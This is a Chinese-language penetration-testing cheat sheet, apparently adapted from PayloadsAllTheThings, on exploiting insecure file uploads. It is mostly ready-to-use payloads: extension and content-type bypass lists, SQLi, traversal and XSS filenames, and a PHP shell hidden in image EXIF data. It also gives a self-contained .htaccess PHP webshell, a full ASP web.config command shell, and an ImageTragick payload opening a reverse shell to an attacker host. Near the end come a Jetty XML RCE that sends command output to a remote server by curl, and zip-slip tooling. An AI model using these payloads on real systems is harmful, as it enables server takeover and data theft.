---
title: Upload Insecure Files
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-03T00:01:16+08:00
categories: 
- 渗透测试
- 外网漏洞
---

# Upload Insecure Files

## 默认扩展

当页面存在文件上传时，通常会在前端或后端限制我们上传文件的后缀，当存在过滤不严格的情况，我们可以使用默认扩展的后缀，直接达到我们的目的

**PHP server**

```php
.php
.php3
.php4
.php5
.php7

# Less known PHP extensions
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
```

**ASP Server **

```
.asp
.aspx
.config
.cer and .asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap
```

**JSP**

```
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions
```

**Perl**

```
.pl, .pm, .cgi, .lib
```

**Coldfusion**

```
.cfm, .cfml, .cfc, .dbm
```

**Node.js**

```
.js, .json, .node
```

## 上传技巧

**双扩展名绕过**

```
.jpg.php
.png.php5
```

**反向双扩展**

```
.php.jpg
利用apache错误配置，具有任何php扩展，但不一定以.php扩展结尾的内容都将执行代码
```

**随机大写或随机小写**

```
.pHp
.pHP5
.PhAr
```

**空字节(适用于pathinfo())**

```
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

**特殊字符**

```
file.php........
//在windows中，文件末尾带有点时，这些点将被删除
file.php%20
file.php%0d%0a.jpg
file.php%0a
//空格和换行符
name.%E2%80%AEphp.jpg  ==> name.jpg.php
%E2%80%AE ==> LRE进行unicode编码的形式，作为一个控制字符出现
//从右到左覆盖(RTLO)
file.php/, file.php.\, file.j\sp, file.j/sp
//斜杠
file.jsp/././././.
//多个字符组合
```

** content-type**

```
Content-Type : application/x-php 
Content-Type : application/octet-stream 
==> 
Content-Type : image/gif
Content-Type : image/png
Content-Type : image/jpeg
```

content-type wordlist:

https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt

在http包中设置两个content-type，一个使用允许的格式，另一个使用不允许的格式

**魔法字节**

有些服务通过识别文件的签名字节来判断合理性，通过添加或替换内容可能造成欺骗

```
PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[ .PNG： \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG: \xff\xd8\xff .JPG： \xff\xd8\xff
GIF: GIF87a OR GIF8;
```

也可以在元数据中添加外壳

******************************************************************************

使用 NTFS 备用数据流 (ADS) 在 Windows 中可以在文件名中插入冒号字符 ":"。这种技术可以用于在服务器上创建具有禁止扩展名的空文件。例如，如果禁止 ".asax" 扩展名，但允许 ".jpg" 扩展名，则可以使用 "file.asax:.jpg" 文件名创建空文件。这个文件可以使用其他技术进行编辑，例如使用其短文件名进行编辑。

除了创建空文件外，"::$data" 模式也可以用于创建非空文件。因此，添加一个点字符 "." 到这个模式后面，可以绕过进一步的限制。例如，"file.asp::$data." 可以创建一个非空文件。

## 文件名漏洞

在某些情况下，文件上传并不是漏洞的根本原因，而是文件上传后文件处理的漏洞。在这种情况下，攻击者可能会利用文件名中的恶意负载来利用这种漏洞。

例如，如果应用程序在处理文件名时没有正确地进行输入验证和过滤，攻击者可能会使用包含恶意代码的文件名来执行任意代码或跨站脚本攻击 (XSS)。攻击者可以将恶意代码嵌入文件名中的文件扩展名、文件路径或其他元数据中。

```
Time-Based SQLi Payloads:
poc.js'(select*from(select(sleep(20)))a)+'.extension
LFI/Path Traversal Payloads:
image.png../../../../../../../etc/passwd
XSS Payloads:
'"><img src=x onerror=alert(document.domain)>.extension
File Traversal:
../../../tmp/lol.png
Command Injection:
; sleep 10;
```

**用于触发 XSS 的 HTML/SVG 文件**

```
svg ==>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15">
    <tspan><![CDATA[<script>alert("XSS");</script>]]></tspan>
  </text>
</svg>
利用 XML 实体注入漏洞，在 SVG 文件中嵌入恶意代码。当浏览器解析 SVG 文件时，它会将 XML 实体解析为相应的字符。
```

**EICAR文件以检查防病毒软件是否存在**

EICAR 文件是一个用于测试防病毒软件是否存在的标准文件。这个文件不包含任何真正的病毒代码，而是包含一段特定的文本字符串，这个字符串是由 European Institute for Computer Anti-Virus Research (EICAR) 所定义的。当防病毒软件扫描这个文件时，它会检测到这个特定的字符串，并将其标记为病毒。

```
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

将这个字符串复制到一个文本文件中，将文件名改为 .com、.exe、.bat 或 .zip 等常见的病毒扩展名,防毒软件扫描文件时会将其标记为病毒

## 图片压缩

**图片马**

将有效的php负载托管在图片中，利用本地文件包含漏洞进行代码执行

https://developer.aliyun.com/aticle/1106993

图片调整大小，在压缩算法中隐藏有效负载以绕过调整大小

JPG：https://virtualabs.fr/Nasty-bulletproof-Jpegs-l

PNG/GIF：https://blog.isec.pl/injection-points-in-popular-image-formats/

```
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

使用imagebook和exiftool插入exif标签

## 配置文件

### .htaccess（php server）

看一个简单的例子

```
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
```

通过修改默认的“禁止”规则，允许 Web 访问 .htaccess 文件

将 .htaccess 文件的 MIME 类型设置为“application/x-httpd-php”，访问包含此文件的目录时，web服务器将解析其中的php代码

**.htaccess as image**

如何上传有效的.htaccess文件，问题来源于一道ctf题目，如何绕过限制上传有效的.htaccess文件

http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster

我们可以使用如下代码来进行图片多语言htaccess文件的创建

```python
# create valid .htaccess/wbmp image

type_header = b'\x00'
fixed_header = b'\x00'
width = b'50'
height = b'50'
payload = b'# .htaccess file'

with open('.htaccess', 'wb') as htaccess:
    htaccess.write(type_header + fixed_header + width + height)
    htaccess.write(b'\n')
    htaccess.write(payload)
```

### web.config(ASP server)

https://soroush.me/blog/2019/08/uploading-web-config-for-fun-and-profit-2/

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>



<%Response.write("<!-"&"-") %>
-->
```

uwsgi.ini(uWSGI server)

```shell
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)
```

## CVE - ImageMagick

如果后端使用 ImageMagick 调整用户图像大小/转换用户图像，尝试利用众所周知的漏洞，例如 ImageTragik

eg:

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

## ZIP Slip

http://snyk.io/research/zip-slip-vulnerability.

### tools

https://github.com/ptoomey3/evilarc

该工具允许我们在zip中添加目录遍历的字符，如果目标服务器解析zip文件,则可进行文件的覆盖，执行任意代码；

```
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
```

https://github.com/usdAG/slipit

由于java中没有对zip文件进行识别的高级库，因此java更加容易遭受到攻击，下面是一段易于受到攻击的代码

```java
   Enumeration<ZipEntry> entries = zip.getEntries();
   while (entries.hasMoreElements()) {
      ZipEntry e = entries.nextElement();
      File f = new File(destinationDir, e.getName());
      InputStream input = zip.getInputStream(e);
      IOUtils.copy(input, write(f));
   }
```

## Jetty RCE

```xml
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/bin/sh</Item>
                    <Item>-c</Item>
                    <Item>curl -F "r=`id`" http://yourServer:1337/</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>
```

将该文件上传至$JETTY_BASE/webapps/可执行rce

## Tools

**fuxploider**

使用示例

```
python3 fuxploider.py --url https://awesomeFileUploadService.com --not-regex "wrong file type"
```

https://github.com/almandin/fuxploider
